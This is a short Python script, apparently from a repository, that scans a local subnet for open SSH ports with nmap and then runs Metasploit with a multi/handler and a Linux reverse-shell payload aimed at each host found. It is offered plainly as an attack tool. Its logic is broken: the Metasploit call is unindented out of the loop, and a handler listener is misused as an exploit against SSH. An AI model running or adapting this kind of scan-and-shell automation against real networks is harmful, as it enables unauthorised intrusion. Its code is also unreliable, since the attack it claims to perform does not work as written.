# Highrise-
python
import nmap
import subprocess

# Define the IP address ranges to scan
ip_ranges = ["192.168.1.1-255"]

# Create a new Nmap Scanner object
scanner = nmap.PortScanner()

# Loop through the IP ranges and scan each IP address
for ip_range in ip_ranges:
    scanner.scan(hosts=ip_range, arguments="-p 22")

    # Loop through the scan results and check for open ports
    for ip_address in scanner.all_hosts():
        if scanner[ip_address].state() == "up":
            for port in scanner[ip_address]["tcp"]:
                if scanner[ip_address]["tcp"][port]["state"] == "open":
                    print(f"Found open port {port} on {ip_address}")

                    # Run Metasploit against the IP address and port
subprocess.run(["msfconsole", "-q", "-x", f"use exploit/multi/handler; set LHOST <your IP>; set LPORT 4444; set PAYLOAD linux/x86/shell_reverse_tcp; set RHOST {ip_address}; set RPORT {port}; exploit"])
